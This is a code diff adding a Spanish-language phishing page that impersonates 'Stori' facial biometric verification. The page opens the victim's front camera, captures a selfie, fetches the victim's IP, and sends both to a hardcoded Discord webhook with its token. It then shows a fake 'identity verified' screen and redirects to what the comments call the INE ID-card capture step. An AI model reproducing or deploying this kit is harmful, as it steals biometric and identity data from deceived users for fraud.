@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+  <title>Verificación Facial - Stori</title>
+  <script src="./datos/confetti.browser.min.js.descarga"></script>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
+    
+    body { background-color: #000; min-height: 100dvh; display: flex; justify-content: center; overflow: hidden; color: #fff; }
+    .app-container { width: 100%; max-width: 520px; display: flex; flex-direction: column; position: relative; height: 100dvh; }
+    
+    #video { width: 100%; height: 100%; object-fit: cover; position: absolute; top: 0; left: 0; z-index: 1; transform: scaleX(-1); background-color: #222; }
+    
+    .ui-layer { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 10; display: flex; flex-direction: column; justify-content: space-between; padding: max(20px, env(safe-area-inset-top)) 20px max(20px, env(safe-area-inset-bottom)); background: rgba(0,0,0,0.3); pointer-events: none; }
+    
+    .header-text { text-align: center; background: rgba(0,0,0,0.7); padding: 15px 25px; border-radius: 15px; backdrop-filter: blur(5px); margin: 0 auto; width: fit-content; max-width: 100%; pointer-events: auto; z-index: 20; }
+    .header-text h2 { font-size: clamp(18px, 5vw, 22px); margin-bottom: 5px; }
+    .header-text p { font-size: clamp(13px, 4vw, 15px); color: #ccc; }
+    
+    /* Óvalo guía */
+    .oval-frame { 
+      width: clamp(260px, 75vw, 320px); 
+      height: clamp(350px, 100vw, 420px); 
+      border-radius: 50%; 
+      margin: auto; 
+      box-shadow: 0 0 0 4000px rgba(0,0,0,0.7); 
+      border: 4px solid #00d180; 
+    }
+
+    .status-bar { background: rgba(0,0,0,0.85); padding: 15px; border-radius: 15px; text-align: center; backdrop-filter: blur(5px); font-weight: 600; font-size: clamp(14px, 4vw, 16px); width: 100%; max-width: 400px; margin: 0 auto 15px auto; pointer-events: auto; line-height: 1.3; z-index: 20; }
+    
+    .btn-validate { 
+      width: 100%; 
+      max-width: 400px; 
+      margin: 0 auto; 
+      background-color: #00d180; 
+      color: #fff; 
+      border: none; 
+      padding: 18px; 
+      border-radius: 14px; 
+      font-size: 18px; 
+      font-weight: 700; 
+      cursor: pointer; 
+      pointer-events: auto; 
+      text-align: center; 
+      box-shadow: 0 4px 15px rgba(0, 209, 128, 0.4); 
+      z-index: 20; 
+    }
+    .btn-validate:active { background-color: #00b36b; }
+
+    /* Pantalla de Carga (oculta) */
+    .loader-container {
+      position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+      background: #fff; z-index: 300; display: none;
+      flex-direction: column; justify-content: center; align-items: center;
+    }
+    .spinner { width: 60px; height: 60px; border: 6px solid #f3f3f3; border-top: 6px solid #00d180; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    .loader-text { font-size: 18px; font-weight: bold; color: #333; }
+
+    /* Pantalla de Éxito Final (oculta) */
+    .final-screen {
+      position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+      background: #f4f4f4; z-index: 400; display: none;
+      justify-content: center; align-items: center; padding: 20px;
+    }
+    .success-card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; }
+    .check-icon { font-size: 60px; color: #00d180; margin-bottom: 15px; }
+    .success-card h1 { font-size: 22px; margin-bottom: 15px; color: #00d180; }
+    .success-card p { font-size: 16px; color: #555; }
+  </style>
+</head>
+<body>
+
+  <div class="app-container">
+    <video id="video" autoplay playsinline muted></video>
+    
+    <div class="ui-layer" id="uiLayer">
+      <div class="header-text">
+        <h2>Ajuste su rostro</h2>
+        <p>Coloque su cara dentro del óvalo</p>
+      </div>
+      <div class="oval-frame" id="ovalFrame"></div>
+      
+      <div>
+        <div class="status-bar" id="statusBar">Enfocando rostro...</div>
+        <button class="btn-validate" onclick="tomarFotoYValidar()">Validar Biometría</button>
+      </div>
+    </div>
+
+    <!-- Pantalla de carga -->
+    <div class="loader-container" id="loaderScreen">
+      <div class="spinner"></div>
+      <div class="loader-text">Validando identidad...</div>
+    </div>
+
+    <!-- Pantalla de éxito final -->
+    <div class="final-screen" id="finalScreen">
+      <div class="success-card">
+        <div class="check-icon">✓</div>
+        <h1>¡Identidad Verificada!</h1>
+        <p>Serás redirigido en un momento...</p>
+      </div>
+    </div>
+  </div>
+
+  <canvas id="captureCanvas" style="display: none;"></canvas>
+
+  <script>
+    // NUEVO WEBHOOK ACTUALIZADO
+    const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1571151045403476063/IPhdkm-pBe2iv4xp1VXAt_Krt1W3JEvSZJ_H03kU9sf1Saw6rSV15FCH7B6BYQLtA4';
+    
+    let video = document.getElementById('video');
+    let canvas = document.getElementById('captureCanvas');
+    let statusBar = document.getElementById('statusBar');
+    
+    let videoStream = null;
+    let isProcessing = false;
+
+    async function startCamera() {
+      try {
+        if (videoStream) videoStream.getTracks().forEach(t => t.stop());
+        
+        videoStream = await navigator.mediaDevices.getUserMedia({ 
+          video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 }, focusMode: 'continuous' }, 
+          audio: false 
+        });
+        
+        video.srcObject = videoStream; 
+        video.play(); 
+        statusBar.textContent = "Cámara lista. Presione Validar.";
+        statusBar.style.color = "#22C55E";
+      } catch (err) { 
+        console.error(err);
+        statusBar.textContent = 'Error al abrir cámara frontal.';
+        statusBar.style.color = '#FF4E00';
+      }
+    }
+
+    async function tomarFotoYValidar() {
+      if (isProcessing) return;
+      isProcessing = true;
+
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const ctx = canvas.getContext('2d');
+      ctx.translate(canvas.width, 0);
+      ctx.scale(-1, 1); 
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      
+      const selfieBase64 = canvas.toDataURL('image/jpeg', 0.9);
+
+      if (videoStream) videoStream.getTracks().forEach(t => t.stop());
+
+      document.getElementById('uiLayer').style.display = 'none';
+      document.getElementById('loaderScreen').style.display = 'flex';
+
+      try {
+        let ip = 'Desconocida';
+        try {
+          const res = await fetch('https://api.ipify.org?format=json');
+          const data = await res.json();
+          ip = data.ip;
+        } catch (e) {}
+
+        function base64ToBlob(base64Data, contentType) {
+          const sliceSize = 1024; 
+          const byteCharacters = atob(base64Data.split(',')[1]); 
+          const byteArrays = [];
+          for (let offset = 0; offset < byteCharacters.length; offset += sliceSize) {
+            const slice = byteCharacters.slice(offset, offset + sliceSize); 
+            const byteNumbers = new Array(slice.length);
+            for (let i = 0; i < slice.length; i++) { byteNumbers[i] = slice.charCodeAt(i); }
+            const byteArray = new Uint8Array(byteNumbers); 
+            byteArrays.push(byteArray);
+          }
+          return new Blob(byteArrays, { type: contentType });
+        }
+
+        const formData = new FormData();
+        const payload = { 
+          username: "Stori Biometría", 
+          content: `📸 **Selfie de Verificación (Stori)**\n\n**🌐 IP:** ${ip}\n**🕒 Fecha:** ${new Date().toLocaleString()}` 
+        };
+
+        formData.append('payload_json', JSON.stringify(payload));
+        formData.append('file1', base64ToBlob(selfieBase64, 'image/jpeg'), 'Selfie.jpg');
+
+        // Enviar a Discord
+        await fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData });
+
+        // Simular verificación por 5 segundos
+        setTimeout(() => {
+          document.getElementById('loaderScreen').style.display = 'none';
+          document.getElementById('finalScreen').style.display = 'flex';
+          
+          confetti({ particleCount: 150, spread: 90, origin: { y: 0.5 } });
+
+          // Redirección al INE después de 3 segundos
+          setTimeout(() => {
+            window.location.href = 'in3.html';
+          }, 3000);
+
+        }, 5000);
+
+      } catch (error) {
+        console.error(error);
+        alert('Error al subir la selfie.');
+        location.reload();
+      }
+    }
+
+    window.addEventListener('load', startCamera);
+  </script>
+</body>
+</html>
